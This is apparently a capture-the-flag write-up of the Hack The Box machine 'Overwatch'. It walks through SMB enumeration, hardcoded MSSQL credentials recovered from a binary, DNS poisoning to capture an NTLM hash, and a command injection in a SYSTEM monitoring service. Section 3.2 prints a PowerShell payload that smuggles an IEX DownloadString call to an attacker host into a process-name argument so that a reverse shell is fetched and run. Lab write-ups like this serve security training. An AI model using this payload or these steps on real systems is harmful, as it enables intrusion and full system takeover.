---
title: "Overwatch - HTB Machine"
date: 2026-02-26 00:06:00 +0000
categories: [HTB-Machines]
tags: [windows, active-directory, mssql, command-injection, dns-poisoning, smb, winrm]
---

## 1. Reconnaissance

### 1.1 Port Scanning

```bash
rustscan -a $targetIp --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Key Findings:**
- **Domain:** `overwatch.htb`
- **Host:** `S200401.overwatch.htb`
- **OS:** Windows Server 2022 (Build 20348)
- **Active Directory Services:** DNS (53), Kerberos (88), LDAP (389/636), SMB (445)
- **Remote Access:** RDP (3389), WinRM (5985)
- **Database:** MSSQL Server 2022 on port 6520

### 1.2 SMB Enumeration

```bash
nxc smb overwatch.htb -u 'guest' -p '' --shares
```

The guest account grants READ access to the `software$` share, which contains monitoring application files.

## 2. User-Level Exploitation

### 2.1 Software Share Analysis

Spidering the `software$` share reveals:

```
software$/Monitoring/
├── Microsoft.Management.Infrastructure.dll
├── overwatch.exe
├── overwatch.exe.config
└── overwatch.pdb
```

### 2.2 Configuration & Credential Extraction

The `overwatch.exe.config` file discloses a WCF service configuration running on `http://localhost:8000/MONITORSERVICE/`.

Reverse-engineering `overwatch.exe` in dnSpy reveals hardcoded credentials:

```
Server=localhost;Database=SecurityLogs;
User Id=sqlsvc;Password=TI0LKcfHzZw1Vv
```

### 2.3 MSSQL Access

```bash
mssqlclient.py 'sqlsvc':'TI0LKcfHzZw1Vv'@overwatch.htb \
  -windows-auth -port 6520
```

### 2.4 Privilege Escalation via DNS

The `sqlsvc` user possesses write permissions to DNS records. By adding a poisoned DNS entry and leveraging coercion techniques, traffic from a management account (`sqlmgmt`) is captured, yielding its NTLM hash.

With the `sqlmgmt` credentials, WinRM access is established.

## 3. Root-Level Compromise

### 3.1 Local Service Exploitation

The monitoring service runs locally as SYSTEM, bound to HTTP.SYS on port 8000. From the WinRM session, the vulnerable WCF endpoint is accessible.

### 3.2 Command Injection Payload

```powershell
$uri = "http://127.0.0.1:8000/MonitorService?wsdl"
$service = New-WebServiceProxy -Uri $uri

$service.KillProcess("calc.exe; powershell -c `"IEX(New-Object " + `
  "Net.WebClient).DownloadString('http://attacker-ip/shell.ps1')`"; #")
```

### 3.3 Reverse Shell Delivery

A PowerShell reverse shell (Nishang) is downloaded and executed with SYSTEM privileges, establishing full system compromise.

---

**Summary:** The engagement exploited guest SMB access to retrieve application binaries, extracted hardcoded credentials, leveraged DNS write permissions for account compromise, and finally exploited a command injection flaw in a local SYSTEM service to achieve complete system takeover.
